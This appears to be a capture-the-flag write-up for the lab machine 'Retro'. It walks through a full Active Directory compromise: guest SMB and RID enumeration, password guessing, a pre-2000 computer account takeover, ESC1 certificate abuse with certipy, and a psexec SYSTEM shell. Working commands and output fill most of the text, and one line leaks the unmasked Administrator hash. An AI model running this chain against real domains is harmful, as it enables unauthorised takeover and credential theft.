# Retro

# Initial FootHold

## Enumeration

### SMB

SMB Null Auth was enabled but not useful to us.

Though `guest` was enabled too, and had `READ` permissions over the `Trainees` share.

```powershell
└─$ netexec smb dc.retro.vl -u guest -p "" --shares                                                                                                                     
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)                    
SMB         10.129.26.138   445    DC               [+] retro.vl\guest:                                                                                                 
SMB         10.129.26.138   445    DC               [*] Enumerated shares                                                                                               
SMB         10.129.26.138   445    DC               Share           Permissions     Remark                                                                              
SMB         10.129.26.138   445    DC               -----           -----------     ------                                                                              
SMB         10.129.26.138   445    DC               ADMIN$                          Remote Admin                                                                        
SMB         10.129.26.138   445    DC               C$                              Default share
SMB         10.129.26.138   445    DC               IPC$            READ            Remote IPC
SMB         10.129.26.138   445    DC               NETLOGON                        Logon server share 
SMB         10.129.26.138   445    DC               Notes                           
SMB         10.129.26.138   445    DC               SYSVOL                          Logon server share 
SMB         10.129.26.138   445    DC               Trainees        READ 
```

Upon connecting to the share, we can see that there’s a file called `Important.txt`.

```powershell
└─$ smbclient -N //$(cat ip)/Trainees
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 23 17:58:43 2023
  ..                                DHS        0  Wed Jun 11 10:17:10 2025
  Important.txt                       A      288  Sun Jul 23 18:00:13 2023
                4659711 blocks of size 4096. 1282156 blocks available
smb: \> get Important.txt
getting file \Important.txt of size 288 as Important.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

Upon downloading the file and reading it, we find the following message

```powershell
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

This might be important for later.

I was not able to use the `--users` option to enumerate available users, but `RIDCycling` was allowed.

```powershell
└─$ netexec smb dc.retro.vl -u guest -p "" --rid-brute > rid-brute.txt
                                                                                                                                                                        
┌──(kali㉿kali)-[~/htblabs/Windows/Retro]
└─$ cat rid-brute.txt                                                 
SMB                      10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB                      10.129.26.138   445    DC               [+] retro.vl\guest: 
SMB                      10.129.26.138   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.129.26.138   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB                      10.129.26.138   445    DC               501: RETRO\Guest (SidTypeUser)
SMB                      10.129.26.138   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB                      10.129.26.138   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB                      10.129.26.138   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB                      10.129.26.138   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB                      10.129.26.138   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB                      10.129.26.138   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB                      10.129.26.138   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB                      10.129.26.138   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB                      10.129.26.138   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB                      10.129.26.138   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB                      10.129.26.138   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB                      10.129.26.138   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB                      10.129.26.138   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB                      10.129.26.138   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB                      10.129.26.138   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB                      10.129.26.138   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB                      10.129.26.138   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB                      10.129.26.138   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB                      10.129.26.138   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB                      10.129.26.138   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB                      10.129.26.138   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB                      10.129.26.138   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB                      10.129.26.138   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB                      10.129.26.138   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB                      10.129.26.138   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB                      10.129.26.138   445    DC               1109: RETRO\tblack (SidTypeUser)
```

Extracting users & groups

```powershell
└─$ cat rid-brute.txt | cut -d '\' -f2 | grep "SidTypeUser" | cut -d '(' -f1 > users.txt
                                                                                                                                                                        
┌──(kali㉿kali)-[~/htblabs/Windows/Retro]
└─$ cat rid-brute.txt | cut -d '\' -f2 | grep "SidTypeGroup" | cut -d '(' -f1 > groups.txt
                                                                                                                                                                        
┌──(kali㉿kali)-[~/htblabs/Windows/Retro]
└─$ cat users.txt                                                                         
Administrator 
Guest 
krbtgt 
DC$ 
trainee 
BANKING$ 
jburley 
tblack 
                                                                                                                                                                        
┌──(kali㉿kali)-[~/htblabs/Windows/Retro]
└─$ cat groups.txt 
Enterprise Read-only Domain Controllers 
Domain Admins 
Domain Users 
Domain Guests 
Domain Computers 
Domain Controllers 
Schema Admins 
Enterprise Admins 
Group Policy Creator Owners 
Read-only Domain Controllers 
Cloneable Domain Controllers 
Protected Users 
Key Admins 
Enterprise Key Admins 
DnsUpdateProxy 
HelpDesk
```

As we see, there’s a `trainee` user, which is probably the user that was referred to in the note.

As we saw from the note, the users did not want a hard password, and the admins were fed up with resetting passwords, it’s safe to guess that this account has a fairly simple password, let’s the the account name itself.

```powershell
└─$ netexec smb $(cat ip) -u "trainee" -p "trainee"         
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.26.138   445    DC               [+] retro.vl\trainee:trainee
```

And it worked !

# Privilege Escalation # 1: Gaining Access to a Domain Computer Account

The first thing I do usually after gaining the first pair of credentials is enumerating bloodhound. But I got 0 benefits out of this. So I decided to go back to point 0 and re-start enumerating shares to see if I have more permissions.

```powershell
└─$ netexec smb $(cat ip) -u "trainee" -p "trainee" --shares                                                                                                            
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)                    
SMB         10.129.26.138   445    DC               [+] retro.vl\trainee:trainee                                                                                        
SMB         10.129.26.138   445    DC               [*] Enumerated shares                                                                                               
SMB         10.129.26.138   445    DC               Share           Permissions     Remark                                                                              
SMB         10.129.26.138   445    DC               -----           -----------     ------                                                                              
SMB         10.129.26.138   445    DC               ADMIN$                          Remote Admin                                                                        
SMB         10.129.26.138   445    DC               C$                              Default share
SMB         10.129.26.138   445    DC               IPC$            READ            Remote IPC
SMB         10.129.26.138   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.26.138   445    DC               Notes           READ            
SMB         10.129.26.138   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.26.138   445    DC               Trainees        READ
```

As we can see, the new user had `READ` permissions on a lot more shares, so I ran `spider_plus` to see what those shares hold

```powershell
└─$ netexec smb $(cat ip) -u "trainee" -p "trainee" -M spider_plus
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.26.138   445    DC               [+] retro.vl\trainee:trainee 
SPIDER_PLUS 10.129.26.138   445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.26.138   445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.26.138   445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.26.138   445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.26.138   445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.26.138   445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.26.138   445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.26.138   445    DC               [*] Enumerated shares
SMB         10.129.26.138   445    DC               Share           Permissions     Remark
SMB         10.129.26.138   445    DC               -----           -----------     ------
SMB         10.129.26.138   445    DC               ADMIN$                          Remote Admin
SMB         10.129.26.138   445    DC               C$                              Default share
SMB         10.129.26.138   445    DC               IPC$            READ            Remote IPC
SMB         10.129.26.138   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.26.138   445    DC               Notes           READ            
SMB         10.129.26.138   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.26.138   445    DC               Trainees        READ            
SPIDER_PLUS 10.129.26.138   445    DC               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.26.138.json".
SPIDER_PLUS 10.129.26.138   445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Notes, SYSVOL, Trainees)
SPIDER_PLUS 10.129.26.138   445    DC               [*] SMB Readable Shares:  5 (IPC$, NETLOGON, Notes, SYSVOL, Trainees)
SPIDER_PLUS 10.129.26.138   445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.26.138   445    DC               [*] Total folders found:  19
SPIDER_PLUS 10.129.26.138   445    DC               [*] Total files found:    8
SPIDER_PLUS 10.129.26.138   445    DC               [*] File size average:    1.09 KB
SPIDER_PLUS 10.129.26.138   445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.26.138   445    DC               [*] File size max:        3.68 KB
```

Reading the file that was stored at `"/home/kali/.nxc/modules/nxc_spider_plus/10.129.26.138.json"`

```powershell
└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.26.138.json                                                                                                      
{                                                                                                                                                                       
    "NETLOGON": {},                                                                                                                                                     
    "Notes": {                                                                                                                                                          
        "ToDo.txt": {                                                                                                                                                   
            "atime_epoch": "2023-07-23 18:05:56",                                                                                                                       
            "ctime_epoch": "2023-07-23 18:02:53",                                                                                                                       
            "mtime_epoch": "2023-07-23 18:05:56",                                                                                                                       
            "size": "248 B"                                                                                                                                             
        },                                                                                                                                                              
        "user.txt": {                                                                                                                                                   
            "atime_epoch": "2025-04-08 23:13:01",                                                                                                                       
            "ctime_epoch": "2025-04-08 23:12:47",                                                                                                                       
            "mtime_epoch": "2025-04-08 23:13:01",                                                                                                                       
            "size": "32 B"                                                                                                                                              
        }                                                                                                                                                               
    },
<SNIP>
```

We see that we have two important files in that share, `user.txt` which is the user flag for the challenge, and `ToDo.txt` which seems important.

Upon downloading the files, reading `ToDo.txt` displayed this message

```powershell
└─$ cat ToDo.txt                                                  
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

The keywords here are `finance`, `banking`, and `pre created computer account`.

If we go back to the list of users we enumerated before, we see that there’s a computer account called `BANKING$`. The note did mention that it’s a pre-created computer account.
pre-created computer accounts were a thing in the past, where an account gets pre-created with the password being the username all lowercase.

Let’s try this and see if it works.

```powershell
└─$ netexec smb $(cat ip) -u 'BANKING$' -p "banking"   
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.26.138   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

We got the error `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`.

The error is not “wrong password”, so this means we guessed it correctly.

This error is common with pre2k accounts, to get around this issue you either have to change the password of the account, or use kerberos authentication.

### Using Kerberos Authentication

```powershell
└─$ netexec smb $(cat ip) -u 'BANKING$' -p "banking" -k
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.26.138   445    DC               [+] retro.vl\BANKING$:banking
```

### Changing pre2k account password

```powershell
└─$ impacket-changepasswd -newpass glitch 'retro.vl/BANKING$:banking@dc.retro.vl'                                                                                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                                                              
                                                                                                                                                                        
[*] Changing the password of retro.vl\BANKING$                                                                                                                          
[*] Connecting to DCE/RPC as retro.vl\BANKING$                                                                                                                          
Traceback (most recent call last):                                                                                                                                      
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 280, in login                                                                                   
    return self._SMBConnection.login(user, password, domain, lmhash, nthash)                                                                                            
           ~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                                                                                            
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1092, in login                                                                                           
    if packet.isValidAnswer(STATUS_SUCCESS):                                                                                                                            
       ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^                                                                                                                             
  File "/usr/lib/python3/dist-packages/impacket/smb3structs.py", line 460, in isValidAnswer                                                                             
    raise smb3.SessionError(self['Status'], self)                                                                                                                       
impacket.smb3.SessionError: SMB SessionError: STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT(The account used is a computer account. Use your global user account or local user account to access this server.)
```

The error shows that impacket tried to use `SMB`, which would not work in this case as we cannot authenticate to SMB.

So we will have to change the protocol to `RPC`.

```powershell
└─$ impacket-changepasswd -protocol rpc-samr -newpass glitch 'retro.vl/BANKING$:banking@dc.retro.vl'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```

Now authentication with SMB works

```powershell
└─$ netexec smb $(cat ip) -u 'BANKING$' -p "glitch"    
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.26.138   445    DC               [+] retro.vl\BANKING$:glitch
```

# Privilege Escalation #2: Gaining Administrative Access

I did not find anything interesting with the user `BANKING$` on SMB or BloodHound.

So I decided to go to enumerating AD CS with `certipy-ad`.

```powershell
└─$ certipy-ad find -u 'BANKING$' -p glitch -target-ip $(cat ip)                                                                                                        
Certipy v5.0.2 - by Oliver Lyak (ly4k)                                                                                                                                  
                                                                                                                                                                        
[*] Finding certificate templates                                                                                                                                       
[*] Found 34 certificate templates                                                                                                                                      
[*] Finding certificate authorities                                                                                                                                     
[*] Found 1 certificate authority                                                                                                                                       
[*] Found 12 enabled certificate templates                                                                                                                              
[*] Finding issuance policies                                                                                                                                           
[*] Found 15 issuance policies                                                                                                                                          
[*] Found 0 OIDs linked to templates                                                                                                                                    
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP                                                                                                               
[!] Failed to connect to remote registry. Service should be starting now. Trying again...                                                                               
[*] Successfully retrieved CA configuration for 'retro-DC-CA'                                                                                                           
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'                                                                                                        
[!] Error checking web enrollment: timed out                                                                                                                            
[!] Use -debug to print a stacktrace                                                                                                                                    
[!] Error checking web enrollment: timed out                                                                                                                            
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250902121027_Certipy.txt'
[*] Wrote text output to '20250902121027_Certipy.txt'
[*] Saving JSON output to '20250902121027_Certipy.json'
[*] Wrote JSON output to '20250902121027_Certipy.json'
```

Reading the file `20250902121027_Certipy.txt`, we find a template that is vulnerable to `ESC1`.

`CA Name                             : retro-DC-CA` (This is the Certificate Authority Name)

`Template Name                       : RetroClients` (This is the Template Name)

`Certificate Name Flag               : EnrolleeSuppliesSubject` (This means that I can choose what user to request the certificate for! - **INTERESTING**)

`Extended Key Usage                  : Client Authentication` (This means that I can use the certificate to authenticate, without this the certificate is useless)

---

```powershell
Enrollment Rights               : RETRO.VL\Domain Admins                                                                                                        
                                  RETRO.VL\Domain Computers                                                                                                     
                                  RETRO.VL\Enterprise Admins
```

This means that only users from these groups can enroll in the certificate, our user, `BANKING$`, is part of the `Domain Computers` group !

## Exploiting ESC1 using Certipy-AD

```powershell
└─$ certipy-ad req -ca retro-DC-CA -u 'BANKING$' -template RetroClients -upn administrator@retro.vl -target $(cat ip)
Certipy v5.0.2 - by Oliver Lyak (ly4k)

Password:
[*] Requesting certificate via RPC
[*] Request ID is 10
[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
Would you like to save the private key? (y/N): y
[*] Saving private key to '10.key'
[*] Wrote private key to '10.key'
[-] Failed to request certificate
```

The attack failed, if we look at the error, it says `The public key does not meet the minimum size required by the specified certificate template.`

Looking at `certipy-ad` help menu

```powershell
└─$ certipy-ad req --help
<SNIP>
-key-size RSA key length
                        Length of RSA key (default: 2048)
<SNIP>
```

Doubling the size of the key fixed the issue

```powershell
└─$ certipy-ad req -ca retro-DC-CA -u 'BANKING$' -template RetroClients -upn administrator@retro.vl -target $(cat ip) -key-size 4096
Certipy v5.0.2 - by Oliver Lyak (ly4k)

Password:
[*] Requesting certificate via RPC
[*] Request ID is 14
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Trying to authenticate with the certificate, we got an `SID` mismatch error

```powershell
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip $(cat ip)                                                                  
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[-] Object SID mismatch between certificate and user 'administrator'
[-] See the wiki for more information
```

### Using impacket-lookupsid to enumerate `SID` of user `administrator`

```powershell
└─$ impacket-lookupsid 'retro.vl/BANKING$:glitch@10.129.26.138'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies                                                                                              
                                                                                                                                                                        
[*] Brute forcing SIDs at 10.129.26.138                                                                                                                                 
[*] StringBinding ncacn_np:10.129.26.138[\pipe\lsarpc]                                                                                                                  
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
<SNIP>
500: RETRO\Administrator (SidTypeUser)
<SNIP>
```

So the SID for user `administrator` is `S-1-5-21-2983547755-698260136-4283918172-500`.

### Requesting new certificate with specifying the `SID`

```powershell
└─$ certipy-ad req -ca retro-DC-CA -u 'BANKING$' -template RetroClients -upn administrator@retro.vl -target $(cat ip) -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
Certipy v5.0.2 - by Oliver Lyak (ly4k)

Password:
[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```

### Authenticating using the certificate & getting the hash

```powershell
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip $(cat ip)
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aa<REDACTED>ee:25<REDACTED>89
```

Using NetExec to confirm local admin access

```powershell
└─$ netexec smb $(cat ip) -u administrator -H aa<REDACTED>ee:25<REDACTED>89
SMB         10.129.26.138   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.26.138   445    DC               [+] retro.vl\administrator:252fac7066d93dd009d4fd2cd0368389 (Pwn3d!)
```

Gaining a shell using `PsExec`

```powershell
└─$ impacket-psexec active.htb/administrator@$(cat ip) -hashes aa<REDACTED>ee:25<REDACTED>89 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.26.138.....
[*] Found writable share ADMIN$
[*] Uploading file utTnUhwK.exe
[*] Opening SVCManager on 10.129.26.138.....
[*] Creating service phSx on 10.129.26.138.....
[*] Starting service phSx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
